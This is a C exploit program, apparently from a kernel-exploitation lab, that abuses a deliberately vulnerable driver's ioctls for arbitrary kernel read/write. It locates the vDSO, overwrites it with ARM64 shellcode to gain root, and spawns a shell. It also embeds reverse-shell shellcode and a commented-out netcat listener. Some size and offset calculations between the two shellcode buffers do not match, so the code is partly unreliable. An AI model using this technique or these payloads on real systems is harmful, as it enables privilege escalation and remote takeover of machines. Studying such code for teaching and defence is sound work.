#define _GNU_SOURCE
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>
#include <sys/prctl.h>   //prctl
#include <sys/auxv.h>    //AT_SYSINFO_EHDR

#ifndef _VULN_DRIVER_
	#define _VULN_DRIVER_
	#define DEVICE_NAME "vulnerable_device"
	#define IOCTL_NUM 0xFE
	#define DRIVER_TEST _IO (IOCTL_NUM,0)
	#define BUFFER_OVERFLOW _IOR (IOCTL_NUM,1,char *)
	#define NULL_POINTER_DEREF _IOR (IOCTL_NUM,2,unsigned long)
	#define ALLOC_UAF_OBJ _IO (IOCTL_NUM,3)
	#define USE_UAF_OBJ _IO (IOCTL_NUM,4)
	#define ALLOC_K_OBJ _IOR (IOCTL_NUM,5,unsigned long)
	#define FREE_UAF_OBJ _IO (IOCTL_NUM,6)
	#define ARBITRARY_RW_INIT _IOR(IOCTL_NUM,7, unsigned long)
	#define ARBITRARY_RW_REALLOC _IOR(IOCTL_NUM,8,unsigned long)
	#define ARBITRARY_RW_READ _IOWR(IOCTL_NUM,9,unsigned long)
	#define ARBITRARY_RW_SEEK _IOR(IOCTL_NUM,10,unsigned long)
	#define ARBITRARY_RW_WRITE _IOR(IOCTL_NUM,11,unsigned long)
	#define UNINITIALISED_STACK_ALLOC _IOR(IOCTL_NUM,12,unsigned long)
	#define UNINITIALISED_STACK_USE _IOR(IOCTL_NUM,13,unsigned long)
#endif

#define PATH "/dev/vulnerable_device"
#define START_ADDR 0xffffffff81000000
#define END_ADDR 0xffffffff83000000

struct init_args {
	size_t size;
};
struct realloc_args{
	int grow;
	size_t size;
};
struct read_args{
	char *buff;
	size_t count;
};
struct seek_args{
	loff_t new_pos;
};
struct write_args{
	char *buff;
	size_t count;
};

int read_mem(int fd, size_t addr,char *buff,int count)
{
	struct seek_args s_args2;
	struct read_args r_args;
	int ret;

	s_args2.new_pos=addr-0x10;
	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args2);  // seek
	r_args.buff=buff;
	r_args.count=count;
	ret=ioctl(fd,ARBITRARY_RW_READ,&r_args);   // read
	return ret;
}
int write_mem(int fd, size_t addr,char *buff,int count)
{
	struct seek_args s_args1;
	struct write_args w_args;
	int ret;

	s_args1.new_pos=addr-0x10;
	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args1);  // seek
	w_args.buff=buff;
	w_args.count=count;
	ret=ioctl(fd,ARBITRARY_RW_WRITE,&w_args);  // write
	return ret;
}

int check_vdso_shellcode(char *shellcode)
{
	size_t addr=0;
	addr=getauxval(AT_SYSINFO_EHDR);
	printf("[+] vdso: 0x%llx\n",addr);
	if (addr<0)
	{
		puts("[-] Cannnot get VDSO addr\n");
		return 0;
	}
	if (memmem((char *)addr,0x1000, shellcode,strlen(shellcode)))
	{
		return 1;
	}
	return 0;
}
struct vdso_patch {
	unsigned char *patch;
	unsigned char *copy;
	size_t size;
	void *addr;
};

static struct vdso_patch vdso_patch[2];

int main()
{
	int fd=-1;
	int result=0;
	struct init_args i_args;
	struct realloc_args rello_args;
	//char shellcode[]="\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9\xFD\xFF\xF2\xFA\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7\x0F\x05";
	char shellcode[]="\xfd\x7b\xbf\xa9\xe1\x53\x9a\x92\xa1\x01\xa0\xf2\x00\x00\x80\x52\xfd\x03\x00\x91\x01\xf8\xdf\xf2\x20\x00\x3f\xd6\xe1\xff\x9a\x92\xa1\x01\xa0\xf2\x01\xf8\xdf\xf2\x20\x00\x3f\xd6\xfd\x7b\xc1\xa8\xc0\x03\x5f\xd6";


	char shellcodereverse[]=
	"\xc8\x18\x80\xd2\x01\xfd\x47\xd3\x20\xf8\x7f\xd3\xe2\x03\x1f\xaa"
	"\xe1\x66\x02\xd4\xe4\x03\x20\xaa\x21\xf8\x7f\xd3\x21\x82\xab\xf2"
	"\xe1\x0f\xc0\xf2\x01\x20\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x63\x22\x8b"
	"\x02\x02\x80\xd2\x68\x19\x80\xd2\xe1\x66\x02\xd4\x41\xfc\x42\xd3"
	"\xe0\x03\x24\xaa\x21\xfc\x41\xd3\xe2\x03\x1f\xaa\x08\x03\x80\xd2"
	"\xe1\x66\x02\xd4\xea\x03\x1f\xaa\x5f\x01\x01\xeb\x21\xff\xff\x54"
	"\xe3\x45\x8c\xd2\x23\xcd\xad\xf2\xe3\x65\xce\xf2\x03\x0d\xe0\xf2"
	"\xe3\x8f\x1f\xf8\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4"; 


	setvbuf(stdout, 0LL, 2, 0LL);
	char *buf=malloc(0x1000);
	fd=open(PATH,O_RDWR);
	if (fd<0){
		puts("[-] open error ! \n");
		exit(-1);
	}
    // 构造任意地址读写
	i_args.size=0x100;
	ioctl(fd, ARBITRARY_RW_INIT, &i_args);
	rello_args.grow=0;
	rello_args.size=0x100+1;
	ioctl(fd,ARBITRARY_RW_REALLOC,&rello_args);
	puts("[+] We can read and write any memory! [+]");
	//爆破VDSO地址
	for (size_t addr=START_ADDR; addr<END_ADDR; addr+=0x1000)
	{
		read_mem(fd,addr,buf,0x1000);
		if (!strcmp("gettimeofday",buf+0x2cd))
		{
			result=addr;
			printf("[+] found vdso 0x%llx\n",result);
			break;
		}
	}
	if (result==0)
	{
		puts("[-] not found, try again! \n");
		exit(-1);
	}
	size_t vdso_addr=result;
	#define VDSO_SIZE 0x1000
	// shellcode写到VDSO,覆盖gettimeofday
	vdso_patch[0].patch = shellcode;
	vdso_patch[0].size = sizeof(shellcode);
	//vdso_patch[0].addr = (unsigned char *)vdso_addr + VDSO_SIZE - sizeof(shellcode);
	vdso_patch[0].addr = (unsigned char *)vdso_addr + VDSO_SIZE - sizeof(shellcodereverse);
    //printf("vdso shellode address:0x%p , shellcode len:0x%d",vdso_patch[0].addr,sizeof(shellcode));
	printf("vdso shellode address:0x%p , shellcode len:0x%d",vdso_patch[0].addr,sizeof(shellcodereverse));
    //write_mem(fd,vdso_patch[0].addr, shellcode,sizeof(shellcode));
	write_mem(fd,vdso_patch[0].addr, shellcode,sizeof(shellcodereverse));
	
	
	//write_mem(fd,result+0xc80, shellcode,strlen(shellcode));    //  $ objdump xxx -T  查看gettimeofday代码偏移

	if (check_vdso_shellcode(shellcodereverse)!=0)
	{
		printf("[+] Shellcode is written into vdso, waiting get_root :\n");
		size_t addr=0;
		addr=getauxval(AT_SYSINFO_EHDR);
		printf("[+] vdso: 0x%llx\n",addr);
		void(*get_root)(void)=addr+VDSO_SIZE-sizeof(shellcode);
		printf("get_root address: 0x%p",get_root);
		(*get_root)();
		if (getuid()==0)
		{
			printf("[+] Congratulations! You get root shell !!! [+]\n");
			system("/bin/sh");
		}
		//printf("[+] Shellcode is written into vdso, waiting for reverse shell :\n");
		//system("nc -lp 3333");
	}
	else
	{
		puts("[-] There are something wrong!\n");
		exit(-1);
	}
	return 0;
}
/*



*/
